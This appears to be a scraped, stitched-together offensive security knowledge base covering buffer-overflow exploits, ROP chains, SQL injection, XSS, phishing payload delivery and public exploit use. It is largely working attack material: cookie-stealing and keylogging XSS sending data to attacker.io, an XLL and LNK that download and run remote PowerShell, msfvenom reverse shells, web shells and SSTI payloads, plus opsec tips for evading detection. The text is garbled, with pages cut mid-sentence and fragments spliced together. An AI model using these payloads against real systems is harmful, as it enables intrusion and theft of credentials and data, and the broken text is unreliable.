/api/zombie-zip/unwrap -H \"X-API-Token: $T\" \\\n -d '{\"container_b64\":\"CONTAINER\"}'\n```\n\nThe `validate` flag performs a decompression round-trip before returning the container.\n\n## condition:\n $lfh at 0 and $cdh and\n uint16(@lfh + 8) == 0 and // method=STORED\n filesize < 52428800\n // Add entropy check on data at offset 30+ for deployed rules\n}\n```\n\n**SIEM detection:** "content": "# Buffer Overflows\n\nBuffer overflows remain a foundational exploitation technique. Understanding them is essential for CTFs, vulnerability research, and understanding modern mitigations.\n\n## Memory Layout\n\n```\nHigh addresses\n┌────────────────────┐\n│ Stack │ ← grows downward\n│ (local vars, │\n│ return addrs, │\n│ saved regs) │\n├────────────────────┤\n│ Heap │ ← grows upward (dynamic allocations)\n├────────────────────┤\n│ BSS │ uninitalized global/static vars\n├────────────────────┤\n│ Data │ initialized global/static vars\n├────────────────────┤\n│ Text │ program code (read-only)\n└────────────────────┘\nLow addresses\n\nStack frame for function f():\n┌────────────────────┐ ← high\n│ caller args │\n├────────────────────┤\n│ return address │ ← EIP/RIP we want to control\n├────────────────────┤\n│ saved EBP/RBP │\n├────────────────────┤\n│ local variables │ ← buffer lives here\n└────────────────────┘ ← ESP/RSP (stack pointer)\n```\n\n---\n\n## Classic Stack Overflow (32-bit)\n\nVulnerable code:\n```c\n#include \n#include \nvoid vuln(char *input) {\n char buf[64];\n strcpy(buf, input); // no bounds check!\n}\nint main(int argc, char **argv) {\n vuln(argv[1]);\n return 0;\n}\n// Compile: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln\n```\n\n### Step 1: Find Offset to EIP\n\n```bash\n# Generate cyclic pattern (Metasploit)\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200\n# Aa0Aa1Aa2Aa3Aa4...\n\n# Run in debugger (gdb with pwndbg or peda)\ngdb ./vuln\nrun $(python3 -c \"print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3')\")\n# SIGSEGV — read EIP value: 0x37654136\n\n# Find offset\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136\n# [*] Exact match at offset 76\n```\n\n### Step 2: Control EIP\n\n```python\npython3 -c \"print('A'*76 + 'BBBB')\" | ./vuln\n# EIP = 0x42424242 (BBBB) — confirmed control\n```\n\n### Step 3: Find Bad Characters\n\n```python\n# Generate all byte values\nbadchars = bytes(range(1, 256)) # exclude \\x00 (null terminator)\npayload = b\"A\" * 76 + b\"B\" * 4 + badchars\n```\n\n```bash\n# In gdb: examine stack after crash, compare against expected sequence\n# Missing or modified bytes = bad chars\n# Common bad chars: \\x00 (null), \\x0a (newline), \\x0d (carriage return), \\xff\n```\n\n### Step 4: Find JMP ESP (No ASLR)\n\n```bash\n# Find JMP ESP instruction in binary or loaded DLLs (must not have ASLR)\nobjdump -d /lib/i386-linux-gnu/libc.so.6 | grep \"jmp.*esp\" | head\n# Or with pwndbg:\npwndbg> jmpcall esp\n# Or with msfpescan:\nmsfpescan -j esp vuln\n\n# Note the address: e.g., 0x0804858b\n```\n\n### Step 5: Shellcode + Exploit\n\n```python\nfrom pwn import *\n\n# msfvenom shellcode (no bad chars)\n# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \\\n# -b \"\\x00\\x0a\\x0d\" -f python\n\nshellcode = b\"\\xdb\\xc0\\xd9\\x74\\x24\\xf4...\" # paste msfvenom output\n\noffset = 76\njmp_esp = p32(0x0804858b) # JMP ESP address (little-endian)\nnop_sled = b\"\\x90\" * 16 # NOP sled before shellcode\n\npayload = b\"A\" * offset + jmp_esp + nop_sled + shellcode\n\np = process(\"./vuln\")\np.sendline(payload)\np.interactive()\n```\n\n---\n\n## Protection Bypasses\n\n### Stack Canaries\n\nCanaries are random values placed before the return address — checked on function return:\n\n```bash\nchecksec ./vuln # check: Canary: Yes/No\n\n# Bypass 1: leak canary (format string, info leak)\n# Bypass 2: brute force (forking servers — canary same across fork())\n# Bypass 3: overwrite __stack_chk_fail GOT entry\n# Bypass 4: bypass via heap/BSS overflow (doesn't touch stack canary)\n```\n\n### NX/DEP (Non-Executable Stack)\n\nStack marked non-executable — shellcode on stack won't run:\n\n```bash\nchecksec ./vuln # NX: enabled\n\n# Bypass: ret2libc — return into libc functions instead of shellcode\n# System(\"/bin/sh\") call:\n# EIP → system(), fake return addr, &\"/bin/sh\"\n\nfrom pwn import *\nelf = ELF('./vuln')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\nsystem_addr = libc.symbols['system']\nbinsh_addr = next(libc.search(b'/bin/sh'))\nexit_addr = libc.symbols['exit']\n\npayload = b\"A\" * offset\npayload += p32(system_addr)\npayload += p32(exit_addr) # return address after system()\npayload += p32(binsh_addr) # argument to system()\n```\n\n### ASLR\n\nASLR randomizes base addresses of stack, heap, and libraries:\n\n```bash\ncat /proc/sys/kernel/randomize_va_space # 2 = full ASLR, 0 = disabled\n\n# Bypass 1: information leak — find base address, calculate offset\n# Bypass 2: brute force 32-bit (1/256 chance per attempt for stack ASLR)\n# Bypass 3: ret2plt — GOT/PLT addresses not randomized with PIE disabled\n# Bypass 4: heap spray — spray large area, increase landing probability\n```\n\n---\n\n## ROP Chains (Return-Oriented Programming)\n\nChain existing code snippets (\"gadgets\") ending in `ret` to execute arbitrary logic without injecting code:\n\n```bash\n# Find gadgets\nROPgadget --binary vuln --rop\nropper -f vuln\n# Look for: pop eax; ret, pop ebx; ret, int 0x80, syscall, etc.\n\n# pwntools ROP automation\nfrom pwn import *\nelf = ELF('./vuln')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh\\x00'))])\nprint(rop.dump())\n\npayload = b\"A\" * offset + rop.chain()\n```\n\n### 64-bit ROP (Linux execve syscall)\n\n```python\n# syscall number: 59 (execve), args in rdi, rsi, rdx\n# execve(\"/bin/sh\", NULL, NULL)\nfrom pwn import *\nelf = ELF('./vuln64')\nrop = ROP(elf)\n\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\npop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] # common combo\npop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]\nsyscall = rop.find_gadget(['syscall'])[0]\npop_rax = rop.find_gadget(['pop rax', 'ret'])[0]\nbinsh = next(elf.search(b'/bin/sh\\x00'))\n\nchain = flat([\n pop_rax, 59, # execve\n pop_rdi, binsh, # filename\n pop_rsi, 0, 0, # argv = NULL (rsi + r15 gadget)\n pop_rdx, 0, # envp = NULL\n syscall\n])\npayload = b\"A\" * offset + chain\n```\n\n---\n\n## Heap Exploitation (Overview)\n\n### Use-After-Free (UAF)\n\n```c\n// Allocate, free, access (dangling pointer)\nchar *ptr = malloc(64);\nfree(ptr);\n// ptr still points to freed memory — if reallocated with attacker data:\n// ptr->function_pointer() → attacker control\n```\n\n### Double Free\n\n```c\nfree(ptr);\n// ... later ...\nfree(ptr); // undefined behavior → heap corruption → potential control\n```\n\n### Heap Spray\n\nFill heap with shellcode + NOP sled to increase hit probability for exploits with imprecise control:\n\n```javascript\n// Browser heap spray (JavaScript)\nvar shellcode = unescape(\"%u9090%u9090...\"); // NOP sled + shellcode\nvar spray = unescape(\"%u9090%u9090\");\nwhile (spray.length < 0x40000) spray += spray;\nvar chunks = [];\nfor (var i = 0; i < 1000; i++) {\n chunks[i] = spray.substr(0, 0x40000 - 32 / 2) + shellcode;\n}\n// Force allocation at predictable address (0x0c0c0c0c)\n```\n\n---\n\n## Tools Reference\n\n| Tool | Purpose |\n|------|---------|\n| pwndbg | GDB plugin — heap visualization, ROP, pattern |\n| pwntools | Python exploit framework — packing, ROP, shellcraft |\n| ROPgadget | Find ROP gadgets in binary |\n| ropper | Gadget finder + ROP chain builder |\n| checksec | Check binary protections |\n| msfvenom | Shellcode generation |\n| one_gadget | Find one-shot shell gadgets in libc |\n| ghidra / IDA | Disassembly / decompilation |\n| angr | Symbolic execution — find paths to vulnerability |\n\n```bash\n# Common pwntools snippets\nfrom pwn import *\ncontext.arch = 'i386' # or 'amd64'\ncontext.os = 'linux'\n\np = process('./vuln') # local\np = remote('target.com', 1337) # remote\np.sendline(payload)\np.recvuntil(b'> ')\np.interactive()\n\n# Shellcode generation\nshellcode = asm(shellcraft.sh())\nshellcode = Development", "content": "# Web Application Testing\n\nComprehensive web application penetration testing covers a broad attack surface — from authentication bypasses to injection flaws, API vulnerabilities, and modern framework weaknesses.\n\n## Methodology\n\n```\n1. Reconnaissance — subdomains, tech stack, endpoints\n2. Mapping — sitemap, parameters, authentication flows\n3. Authentication — login bypass, session management, MFA\n4. Authorization — IDOR, privilege escalation, BOLA/BFLA\n5. Injection — SQLi, XSS, SSTI, XXE, command injection\n6. Business Logic — workflow bypasses, race conditions\n7. APIs — REST, GraphQL, SOAP, gRPC\n8. Infrastructure — server misconfigs, exposed services\n```\n\n---\n\n## Reconnaissance\n\n```bash\n# Subdomain enumeration\nsubfinder -d target.com -all -o subs.txt\namass enum -passive -d target.com -o amass.txt\ncat subs.txt amass.txt | sort -u | httprobe > alive.txt\n\n# Technology fingerprinting\nwhatweb https://target.com\nwappalyzer (browser extension)\ncurl -I https://target.com | grep -i \"server\\|x-powered\\|x-generator\"\n\n# Directory and file brute force\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 200,301,302,403\nferoxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt\n\n# Parameter discovery\narjun -u https://target.com/api/endpoint --get --post\nffuf -w params.txt -u \"https://target.com/search?FUZZ=test\"\n\n# JavaScript analysis (hidden endpoints, API keys)\ngau target.com | grep \"\\.js$\" | sort -u # all JS files\ncat *.js | grep -E \"api_key|apiKey|secret|token|password|Bearer\"\nlinkfinder -i https://target.com -d # extract endpoints from JS\n```\n\n---\n\n## Burp Suite Workflow\n\n```\n1. Scope: Target → Scope → Add target domain(s)\n2. Proxy: browse application — Burp intercepts all traffic\n3. Crawl: Spider/Crawl to map application automatically\n4. Scan: Active scan (Pro) or manual testing\n5. Repeater: Test individual requests\n6. Intruder: Fuzzing, brute force\n7. Decoder: Encode/decode base64, URL, hex, etc.\n8. Comparer: Diff two responses\n```\n\n```bash\n# Useful Burp extensions:\n# - Active Scan++: additional active scan checks\n# - AuthMatrix: test authorization across user roles\n# - JSON Web Tokens: JWT analysis and attacks\n# - Param Miner: discover hidden parameters\n# - Turbo Intruder: high-speed Intruder replacement\n# - Retire.js: detect vulnerable JS libraries\n# - Reflected Parameters: find reflection points for XSS\n```\n\n---\n\n## SQL Injection\n\n### Detection\n\n```bash\n# Manual: add ' or \" to parameter, look for database error\nhttps://target.com/item?id=1'\n# Error: \"You have an error in your SQL syntax...\" → MySQL confirmed\n\n# Boolean-based detection\nid=1 AND 1=1 → normal response\nid=1 AND 1=2 → different response (blind SQLi)\n\n# Time-based detection\nid=1; SLEEP(5)-- MySQL\nid=1; WAITFOR DELAY '0:0:5'-- MSSQL\nid=1; pg_sleep(5)-- PostgreSQL\n```\n\n### sqlmap\n\n```bash\n# Basic scan\nsqlmap -u \"https://target.com/item?id=1\" --dbs\n\n# POST request\nsqlmap -u \"https://target.com/login\" --data=\"user=admin&pass=test\" -p user\n\n# With session cookie\nsqlmap -u \"https://target.com/profile?id=1\" --cookie=\"session=abc123\" --dbs\n\n# Dump specific database/table\nsqlmap -u \"https://target.com/item?id=1\" -D targetdb -T users --dump\n\n# Bypass WAF\nsqlmap -u \"...\" --tamper=space2comment,randomcase,charunicodeescape\n\n# OS command execution (if privileged)\nsqlmap -u \"...\" --os-shell # interactive OS shell via SQLi\n\n# From Burp request file\nsqlmap -r request.txt --level=5 --risk=3\n```\n\n### Manual Exploitation (MySQL)\n\n```sql\n-- UNION-based\nid=1 UNION SELECT NULL,NULL,NULL-- -- find column count\nid=1 UNION SELECT user(),version(),NULL-- -- fingerprint\nid=1 UNION SELECT username,password,NULL FROM users--\n\n-- Error-based\nid=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--\n\n-- Blind (boolean)\nid=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n\n-- Time-based blind\nid=1 AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--\n\n-- Stacked queries (MSSQL)\nid=1; INSERT INTO users VALUES ('hacker','hash')--\n```\n\n---\n\n## Cross-Site Scripting (XSS)\n\n### Detection\n\n```html\n\n\n\">\n'>\njavascript:alert(1)\n\" onmouseover=\"alert(1)\n\n\n\n```\n\n### Exploits\n\n```javascript\n// Session hijacking\nfetch(\"https://attacker.io/steal?c=\"+document.cookie)\n\n// Keylogger\ndocument.addEventListener('keypress', e => {\n fetch('https://attacker.io/k?k=' + e.key)\n})\n\n// Phishing via XSS (inject login form)\ndocument.body.innerHTML = '
...'\n\n// BeEF hook (Browser Exploitation Framework)\n\n```\n\n### CSP Bypass\n\n```javascript\n// If CSP allows 'unsafe-inline' → standard XSS works\n// If CSP uses nonce: need to steal nonce or find nonce reuse\n\n// Bypass via JSONP endpoint (allowed origin)\n// If *.cdn.target.com allowed and cdn has JSONP:\n\n\n// Bypass via Angular/Vue (if ng-app or v-html in allowed script source)\n// AngularJS sandbox escape: {{constructor.constructor('alert(1)')()}}\n\n// SVG XSS (often bypasses HTML sanitizers)\n\n\n\n```\n\nThe ISO/IMG file bypasses Mark-of-the-Web (MotW) since container formats do not propagate the zone identifier to contained files. This was the dominant initial access technique in 2022-2023 before Microsoft patched MotW propagation for ISO files.\n\n## Container Format Delivery\n\n**ISO/IMG files**: Mount as virtual drives, contained executables lack MotW. Microsoft patched this in November 2022 but bypasses continue to emerge.\n\n**OneNote (.one) files**: Weaponized in early 2023 by embedding HTA/BAT/CMD/VBS files behind a fake button overlay. Microsoft added file extension blocking in March 2023.\n\n**CHM files**: Compiled HTML help files execute JavaScript via `ActiveXObject`. Often overlooked by email filters.\n\n**LNK files**: Windows shortcuts with embedded commands:\n\n```\n# Create weaponized LNK\n$s = New-Object -ComObject WScript.Shell\n$lnk = $s.CreateShortcut(\"C:\\temp\\Document.lnk\")\n$lnk.TargetPath = \"C:\\Windows\\System32\\cmd.exe\"\n$lnk.Arguments = \"/c powershell -ep bypass -w hidden -e BASE64PAYLOAD\"\n$lnk.IconLocation = \"C:\\Windows\\System32\\shell32.dll,1\"\n$lnk.Save()\n```\n\n## Office Macro Techniques\n\n**VBA Stomping**: Remove the VBA source code from the Office document while keeping the compiled p-code. AV scanners that analyze source code miss the actual payload. Use tools like `EvilClippy`.\n\n**Remote Template Injection**: The document fetches a macro-enabled template at runtime:\n\n```xml\n\n\n```\n\nThe initial document contains no macros (bypasses static scanning) and pulls the weaponized template only when opened.\n\n**XLM (Excel 4.0) Macros**: Legacy macro format less analyzed by AV than VBA. Use `Auto_Open` in a macro sheet.\n\n## Browser-in-the-Browser (BitB)\n\nCreate a fake browser window (popup) within the page using CSS/HTML to mimic an OAuth login prompt. The victim sees a legitimate-looking URL in the fake address bar. Effective for OAuth phishing against Google, Microsoft, and other SSO providers.\n\n## Gophish Campaign Management\n\n```bash\n# Launch Gophish\n./gophish\n\n# Configure via API or web UI:\n# 1. Sending profile (SMTP server)\n# 2. Landing page (clone with credentials capture)\n# 3. Email template (HTML with tracking pixel and link)\n# 4. User group (target email list)\n# 5. Campaign launch with scheduling\n```\n\nTrack opens, clicks, and credential submissions. Use tracking pixels for engagement metrics.\n\n## Alternative Channels\n\n**QR Code Phishing (Quishing)**: Embed malicious URLs in QR codes sent via email or physical media. Bypasses URL scanning since the link exists as an image. Mobile devices often lack corporate security controls.\n\n**Vishing**: Voice phishing with pretexting. Call targets claiming to be IT support, request they navigate to a credential harvesting page or install remote access software.\n\n**SMS Smishing**: Use Twilio or similar APIs to send SMS with shortened malicious URLs. Mobile browsers show less URL context.\n\n**Teams/Slack Phishing**: Guest access features allow external users to send messages. Combine with domain impersonation for trusted-looking messages within the collaboration platform.\n\n## OpSec Notes\n\n- Age phishing domains 30+ days minimum; categorize via Cloudflare/Symantec/Bluecoat\n- Use legitimate email infrastructure (SendGrid, Mailgun) for deliverability\n- EvilGinx phishlets should match target's login page version — test before deployment\n- Rotate phishing infrastructure after each campaign to avoid blocklisting\n- Strip metadata from all Office documents before sending\n\n## Detection Notes\n\nReverse proxy phishing is detected by: impossible travel (login from unexpected geo), token replay detection, device compliance checks, and FIDO2 origin binding. Email gateways detect HTML smuggling via JavaScript analysis. Modern sandboxes detonate container files. Defender for Office 365 detects known phishlet signatures in URLs.\n\n---\n\n## XLL / XLSB Attacks (Macro-less Office)\n\nXLL files are Excel Add-In DLLs — loaded by Excel with no macro warning:\n\n```c\n// malicious.xll — DLL with Excel entry point\n#include \n__declspec(dllexport) void __cdecl xlAutoOpen() {\n // Called when Excel opens the XLL\n WinExec(\"powershell -w h -ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/p')\\\"\", SW_HIDE);\n}\n// Compile: x86_64-w64-mingw32-gcc -shared -o payload.xll malicious.c\n// Deliver as \"Report.xll\" attachment — user double-clicks → Excel loads → exec\n```\n\n**XLSB** (Excel Binary Workbook): macros in binary format — harder for AV to scan:\n```\n1. Create Excel with macros (standard .xlsm)\n2. Save As → Excel Binary Workbook (.xlsb)\n3. Binary format obscures macro content from signature-based scanners\n4. Deliver as \"Q1_Data.xlsb\" — macros still execute on open (if macro enabled)\n```\n\n---\n\n## Polyglot Files\n\nA polyglot is a file valid in two different formats simultaneously:\n\n```bash\n# PDF + ZIP polyglot: valid PDF that is also a valid ZIP\n# The PDF viewer opens it as a PDF; unzip opens it as ZIP containing malicious content\n# Use case: bypass file type checks (upload as \"PDF\", extract as ZIP with .exe payload)\n\n# Create PDF+ZIP polyglot\ncat legitimate.pdf malicious.zip > polyglot.pdf\n# Or use PolyDrop tool: github.com/polydawn/polydrop\n\n# PDF + JavaScript: valid PDF with embedded JS (Adobe Reader executes on open)\n# Use msfvenom or peepdf to embed JS in PDF\n\n# HTML + HTA polyglot:\n# File is valid HTML for browsers but valid HTA for mshta.exe\n# MIME-type confusion enables execution when saved and opened\n\n# JPEG + PHP: image that executes as PHP (for unrestricted file upload exploitation)\n# Append PHP code after JPEG EOI marker (0xFFD9)\necho '' >> legitimate.jpg\n# Upload as \"image.jpg\" → access at /uploads/image.jpg?cmd=id (if PHP processes all files)\n```", "last_updated": "2026-03-17"}, "public-exploits": {"slug": "public-exploits", "title": "Using Public Exploits", "category": "Initial Access", "content": "# Using Public Exploits\n\nLeveraging known vulnerabilities and public exploit code for initial access. Covers discovery, weaponization, and safe execution.\n\n## Vulnerability Discovery\n\n**searchsploit** (offline ExploitDB mirror):\n```bash\nsearchsploit apache 2.4\nsearchsploit -x 12345 # examine exploit\nsearchsploit -m 12345 # mirror/copy exploit locally\nsearchsploit --nmap nmap.xml # parse Nmap XML for matching exploits\n```\n\n**Online databases**: ExploitDB, PacketStorm, NVD, GitHub (search for CVE-YYYY-XXXX), Nuclei templates repository, 0day.today.\n\n**CVE prioritization**: Focus on vulnerabilities that are: (1) remotely exploitable without authentication, (2) affect target's identified technology stack, (3) have public PoC code, (4) rated CVSS 7.0+ or have known exploitation in the wild (CISA KEV catalog).\n\n## Metasploit Framework\n\n```bash\nmsfconsole\n\n# Search for modules\nsearch type:exploit name:apache\nsearch cve:2024\n\n# Standard exploitation workflow\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target.com\nset RPORT 443\nset SSL true\nset LHOST attacker.com\nset LPORT 443\nset PAYLOAD linux/x64/meterpreter/reverse_https\nexploit\n\n# Useful auxiliary scanners\nuse auxiliary/scanner/smb/smb_ms17_010\nuse auxiliary/scanner/http/ssl_version\nuse auxiliary/scanner/ssh/ssh_version\n\n# Post-exploitation modules\nuse post/multi/gather/credentials\nuse post/windows/gather/hashdump\nuse post/linux/gather/enum_system\n```\n\n**Payload generation with msfvenom**:\n```bash\n# Windows\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f exe -o payload.exe\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f dll -o payload.dll\n\n# Linux\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload.elf\n\n# Web payloads\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=attacker LPORT=4444 -f raw > shell.php\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f raw > shell.jsp\n```\n\n## Weaponizing PoC Code\n\nRaw PoC code from GitHub/ExploitDB often requires modification for operational use:\n\n1. **Read the code thoroughly** — understand the vulnerability mechanism, not just the trigger\n2. **Test in a lab** — set up a matching version of the vulnerable software\n3. **Modify payload delivery** — replace calc.exe/notepad.exe with your shellcode or C2 callback\n4. **Handle errors gracefully** — add exception handling to prevent target crashes\n5. **Remove indicators** — change default User-Agent strings, remove author signatures, randomize sleep timers\n6. **Add cleanup** — restore overwritten memory/state if possible to maintain target stability\n\n## Exploit Chaining\n\nSingle vulnerabilities often provide limited access. Chain them for full impact:\n\n- **SSRF → Cloud credential theft → Lateral movement**: SSRF to IMDSv1 → AWS keys → access other services\n- **SQLi → File write → RCE**: SQL injection to write a web shell via `INTO OUTFILE` or `COPY TO`\n- **LFI → Log poisoning → RCE**: Include access log after injecting PHP via User-Agent header\n- **XSS → CSRF → Admin account creation**: Steal admin CSRF token via XSS, then create a backdoor admin account\n- **Open redirect → OAuth token theft**: Chain open redirect in OAuth callback to steal authorization codes\n\n## Patch Diff Analysis\n\nFor new CVEs without public exploits:\n\n1. Download patched and unpatched versions of the software\n2. Diff the binary or source code to identify the vulnerability fix\n3. Understand the vulnerable code path\n4. Develop a trigger that exercises the unpatched code path\n5. Build reliable exploitation\n\nTools: `bindiff` (binary), `diff`/`meld` (source), `ghidra` (decompilation comparison).\n\n## Nuclei for Automated Vulnerability Scanning\n\n```bash\n# Update templates\nnuclei -update-templates\n\n# Scan with all templates\nnuclei -u https://target.com -t /path/to/nuclei-templates/ -severity critical,high\n\n# Specific template categories\nnuclei -l urls.txt -t cves/ -t exposures/ -t misconfiguration/ -o nuclei_results.txt\n```\n\nNuclei provides lower false-positive rates than traditional scanners and covers recently disclosed CVEs quickly via community template updates.\n\n## OpSec Notes\n\n- Always test exploits in a lab environment matching the target version before live engagement\n- Metasploit signatures are heavily detected — consider using standalone exploit code or custom implementations\n- msfvenom payloads are signatured by every AV — use custom shellcode or obfuscation\n- Document every exploit attempt for the engagement report, including failed attempts\n- Have a rollback plan for exploits that may destabilize the target (especially memory corruption bugs)\n- Avoid kernel exploits on production systems unless explicitly authorized\n\n## Detection Notes\n\nExploit scanners like Nuclei and Nmap NSE generate distinctive traffic patterns. Metasploit's default stagers have well-known network signatures. IDS/IPS rules exist for most public exploits. Post-exploitation activity (new processes, network connections) is more likely to trigger EDR alerts than the initial exploit.\n\n## Notable Exploit Frameworks\n\n### Impacket\n\nPython library for network protocol interaction — essential for Windows exploitation:\n\n```bash\npip install impacket\n\n# SMB command execution (PsExec-style)\nimpacket-psexec DOMAIN/user:password@TARGET_IP\n\n# WMI execution\nimpacket-wmiexec DOMAIN/user:password@TARGET_IP\n\n# DCOM execution\nimpacket-dcomexec DOMAIN/user:password@TARGET_IP\n\n# EternalBlue (MS17-010)\nimpacket-smbexec -hashes :NTHASH DOMAIN/user@TARGET_IP\n\n# Kerberos ticket request\nimpacket-getTGT DOMAIN/user:password -dc-ip DC_IP\n```\n\n### CrackMapExec / NetExec\n\nSwiss army knife for network enumeration and exploitation:\n\n```bash\n# SMB reconnaissance\nnxc smb 192.168.1.0/24 -u user -p password\n\n# Check for MS17-010\nnxc smb TARGET_IP -u '' -p '' --shares\n\n# Dump SAM hashes (requires admin)\nnxc smb TARGET_IP -u admin -p password --sam\n\n# Execute commands\nnxc smb TARGET_IP -u admin -p password -x \"whoami\"\n\n# Spray credentials\nnxc smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success\n```\n\n### Sliver / Cobalt Strike Integration\n\nMany public exploit PoCs can be modified to deliver Sliver stagers or arbitrary shellcode:\n\n```bash\n# Generate shellcode from Sliver\nsliver > generate --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin\n\n# Inject shellcode into PoC\npython3 poc_exploit.py --target TARGET_IP --shellcode /tmp/beacon.bin\n```\n\n## Common Vulnerability Classes\n\n### Remote Code Execution via Deserialization\n\nJava deserialization vulnerabilities affect: Apache Struts, Jenkins, WebLogic, JBoss, user has file read/write privileges:\n\n```sql\n-- MySQL: write web shell (requires FILE privilege + writable webroot)\nSELECT '' INTO OUTFILE '/var/www/html/shell.php';\n\n-- MSSQL: enable xp_cmdshell\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n\n-- PostgreSQL: COPY command for file write\nCOPY (SELECT '') TO '/var/www/html/shell.php';\n```\n\n### Server-Side Template Injection (SSTI)\n\nDetection payloads by template engine:\n\n```\nJinja2 (Python): {{7*7}} → 49\nTwig (PHP): {{7*7}} → 49\nFreeMarker (Java): ${7*7} → 49\nSmarty (PHP): {$smarty.version}\nERB (Ruby): <%= 7*7 %>\n```\n\nJinja2 RCE payload:\n\n```\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n```\n\nTwig RCE:\n\n```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n```\n\n## Public Exploit Repositories\n\n| Source | URL | Notes |\n|---|---|---|\n| ExploitDB | coverage of web application vulnerability classes for gaining initial access or pivoting deeper into target infrastructure.\n\n## SQL Injection\n\n**Detection**: Inject single quotes, boolean conditions, and time-based payloads to identify injection points.\n\n**Union-based extraction**:\n```sql\n' UNION SELECT NULL,NULL,NULL-- - -- determine column count\n' UNION SELECT 1,username,password FROM users-- -\n```\n\n**Blind Boolean**:\n```sql\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -\n```\n\n**Time-based Blind**:\n```sql\n-- MySQL: ' AND SLEEP(5)-- -\n-- MSSQL: ' WAITFOR DELAY '0:0:5'-- -\n-- PostgreSQL: ' AND pg_sleep(5)-- -\n```\n\n**Out-of-Band (OOB)**:\n```sql\n-- MSSQL DNS exfil\n'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- -\n-- Oracle\n' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual-- -\n```\n\n**sqlmap** accelerates exploitation:\n```bash\nsqlmap -u \"https://target.com/page?id=1\" --level=5 --risk=3 --batch --dbs\nsqlmap -u \"https://target.com/page?id=1\" -D targetdb -T users --dump\nsqlmap -u \"https://target.com/page?id=1\" --os-shell # RCE via SQL\nsqlmap -u \"https://target.com/page?id=1\" --file-read=\"/etc/passwd\"\n```\n\n## Cross-Site Scripting (XSS)\n\n**Reflected**: Inject scripts via URL parameters that get reflected in the page response, enabling cookie theft or session hijacking.\n\n**Stored**: Inject payload into database fields rendered to other users (comments, profiles, messages).\n\n**DOM-based**: Exploit client-side sinks (innerHTML, eval, setTimeout) via sources (location.hash, URL parameters, postMessage).\n\n**CSP Bypass**: When Content-Security-Policy restricts inline scripts, use JSONP endpoints on allowed CDNs, Angular template injection, or script gadgets in allowed libraries.\n\n## Server-Side Request Forgery (SSRF)\n\nForce the server to make requests to internal resources:\n\n```\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttps://target.com/fetch?url=http://127.0.0.1:8080/admin\nhttps://target.com/fetch?url=file:///etc/passwd\n```\n\n**Filter bypasses**: Use decimal IP (2130706433 = 127.0.0.1), IPv6 ([::1]), DNS rebinding, URL encoding, @ redirects, or alternate schemes.\n\n**AWS IMDSv1** is the highest-impact SSRF target, yielding temporary IAM credentials. IMDSv2 requires a PUT with TTL header, blocking simple SSRF.\n\n## XML External Entity (XXE)\n\n```xml\n\n\n]>\n&xxe;\n```\n\nBlind XXE via OOB: use a malicious DTD hosted on attacker server to exfiltrate file content via HTTP or DNS.\n\n## Server-Side Template Injection (SSTI)\n\nDetect with polyglot: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. If the response contains 49, the template engine evaluates input.\n\n**Jinja2 (Python)**: Access os module through class hierarchy traversal to execute commands.\n\n**Twig (PHP)**: Register callback functions to achieve code execution.\n\n**FreeMarker (Java)**: Instantiate the Execute utility class for command execution.\n\n## Deserialization\n\n**Java**: Use ysoserial to generate gadget chain payloads. Identify deserialization by finding magic bytes `ac ed 00 05` in traffic or base64-encoded variants.\n\n**PHP**: `unserialize()` with magic methods (__wakeup, __destruct). PHPGGC generates gadget chains.\n\n**.NET**: BinaryFormatter, XmlSerializer, JavaScriptSerializer with TypeNameHandling. Use ysoserial.net.\n\n## File Upload Bypass\n\nTechniques to bypass upload restrictions:\n- Extension bypass: `.php5`, `.phtml`, `.php.jpg`, `.php%00.jpg` (null byte)\n- Content-Type manipulation: Change to `image/jpeg` while uploading PHP\n- Magic bytes: Prepend `GIF89a` to PHP file\n- Polyglot files: Valid JPEG that is also valid PHP\n- .htaccess upload: Add handler directive then upload PHP with allowed extension\n- Case variation: `.PhP`, `.PHP`\n\n## JWT 